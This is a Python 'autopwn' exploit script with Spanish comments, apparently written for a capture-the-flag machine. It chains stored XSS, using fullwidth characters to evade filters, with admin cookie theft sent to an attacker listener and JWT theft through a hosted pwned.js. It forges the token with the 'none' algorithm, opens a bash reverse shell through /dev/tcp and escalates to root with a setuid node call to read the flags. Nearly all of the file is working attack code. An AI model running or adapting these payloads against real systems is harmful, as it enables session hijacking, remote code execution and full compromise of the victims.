#!/usr/bin/env python3

# Author: Álvaro Bernal (aka. trr0r)

import requests, signal, sys, time, logging, json, jwt, keyboard
from pwn import *
from termcolor import colored
from threading import Thread
from multiprocessing import Process, Queue
from werkzeug import Request, Response, run_simple
from base64 import b64encode, b64decode

PORT = 80
LISTEN_NC = 443
target_ip = ""
host_ip = ""

payload_cmd ='''x=new XMLHttpRequest;x.onload=()=>new Image().src="http://%s:%i/?i="+btoa(x.responseText);x.open("POST","http://localhost:3000/command");x.setRequestHeader("Content-Type","application/json");x.send('{"command":"bash -c \\'bash -i >& /dev/tcp/%s/%i 0>&1\\'", "token":"%s"}')'''

payload_token ='''x=new XMLHttpRequest;x.onload=()=>new Image().src="http://%s:%i/info?i="+btoa(x.responseText);x.open("POST","http://localhost:3000/login");x.setRequestHeader("Content-Type","application/json");x.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}')'''

# Ocultar el output
loger = logging.getLogger('werkzeug')
loger.setLevel(logging.ERROR)

def get_ip():
    if len(sys.argv) != 3:
        print(colored("\n\t[+] Uso: validation_autopwn.py target_ip host_ip\n", 'blue'))
        sys.exit(1)
    else:
        return [sys.argv[1], sys.argv[2]]

def ctrl_c(key, event):
    print(colored("\n[!] Saliendo ...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def check_connect():
    resultado = subprocess.run(["timeout", "1", "ping", "-c", "1", target_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if resultado.returncode != 0:
        print(colored("\n[!] No tienes conectividad con la máquina víctima\n", 'red'))
        sys.exit(1)

def inject_cookie():
    main_url = f"http://{target_ip}/procesarRegistro.php"
    body_request = {
        "username" : f"＜script＞let img＝document．createElement（＂img＂）；img．src＝＂http：／／{host_ip}：{PORT}／?cookie=＂+document．cookie＜／script＞",
        "password" : "pwned"
    }
    requests.post(main_url, data=body_request)

def cookie_hijacking():
    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea
    cookie_log = log.progress(colored("Capturando la cookie del admin", 'blue'))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host_ip, PORT))

        server.listen(1)

        while True:
            client, client_addr = server.accept()
            request = client.recv(1024).decode("utf-8")
            if "GET /?cookie" in request and target_ip == client_addr[0]:
                cookie = request.splitlines()[0].split("PHPSESSID=")[-1].split(" ")[0]
                cookie_log.success(colored(f"Cookie del usuario admin capturada, \"{cookie}\"", 'green'))
                break
    return cookie

def inject_token():
    main_url = f"http://{target_ip}/procesarRegistro.php"
    body_request = {
        "username" : f"＜script ｓｒｃ＝＂http：／／192.168.26.10:80／pwned．js＂＞＜／script＞",
        "password" : "pwned2"
    }
    requests.post(main_url, data=body_request)


def get_token(q: Queue) -> None:
    @Request.application
    def app(request: Request) -> Response:
        path = request.path.strip().lower()
        if path.endswith("/pwned.js"):
            with open("./pwned.js", "r") as f:
                js_content = f.read()
            return  Response(js_content, content_type='application/javascript')
        elif path.endswith("/info"):
            if "i" in request.args:  # Aseguramos que el parámetro "i" esté presente
                q.put(request.args["i"])  # Poner el token en la cola
        return Response("", 204)

    run_simple("0.0.0.0", PORT, app)  # Iniciar el servidor en 0.0.0.0:PORT

def run_flask_token():
    q = Queue()
    p = Process(target=get_token, args=(q,))
    p.start()

    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea
    token_log = log.progress(colored("Capturando el token del usuario Jose", 'blue'))
    token = q.get(block=True)  # Esperar el token desde la cola
    token_log.success(colored(f"Token del usuario Jose captuado, \"{token}\"", 'green'))
    p.terminate()  # Terminar el servidor Flask
    token = jwt.decode(json.loads(b64decode(token).decode())["token"], options={"verify_signature": False})
    token["role"] = "admin"
    token = jwt.encode(token, key=None, algorithm="none")
    return token

def get_cmd(q: Queue) -> None:
    @Request.application
    def app(request: Request) -> Response:
        path = request.path.strip().lower()
        if path.endswith("/pwned.js"):
            with open("./pwned.js", "r") as f:
                js_content = f.read()
            q.put("")
            return Response(js_content, content_type='application/javascript')
        return Response("", 204)


    run_simple("0.0.0.0", PORT, app)  # Iniciar el servidor en 0.0.0.0:PORT

def run_flask_cmd():
    q = Queue()
    p = Process(target=get_cmd, args=(q,))
    p.start()

    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea
    token_log = log.progress(colored("Esperando a que el admin visite la página para que nos envie la Reverse Shell", 'blue'))
    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea

    listening() # Nos ponemos en escucha

    q.get(block=True)  # Esperar a que se realize la petición a /pwned.js
    p.terminate()  # Terminar el servidor Flask

def write_pwned_js(content, type):

    if type == "t":
        with open("pwned.js", "w") as f:
            f.write(content % (host_ip, PORT))
    elif type == "c":
        with open("pwned.js", "w") as f:
            f.write(content % (host_ip, PORT, host_ip, LISTEN_NC, token))

def listening():
    listener = listen(LISTEN_NC)
    conn = listener.wait_for_connection()

    conn.recv() # Recibimos el primer banner
    conn.recv() # Recibimos el segundo banner
    conn.sendline(b"""/usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'""")
    conn.recv().decode() # Recibimos el output del comando anterior

    conn.sendline(b"""echo "User Flag -> `cat /home/ctesias/user.txt`" """)
    conn.sendline(b"""echo "Root Flag -> `cat /root/root.txt`" """)
    print(conn.recv().decode())
    print(conn.recv().decode())
    print(conn.recv().decode())

    conn.interactive()

if __name__ == '__main__':
    target_ip, host_ip = get_ip()
    check_connect()

    # Operativas innecesarias pero se han realizado por puro aprendizaje
    #inject_cookie()
    #cookie = cookie_hijacking()

    inject_token()
    write_pwned_js(payload_token, "t")
    token = run_flask_token()
    write_pwned_js(payload_cmd, "c")
    run_flask_cmd()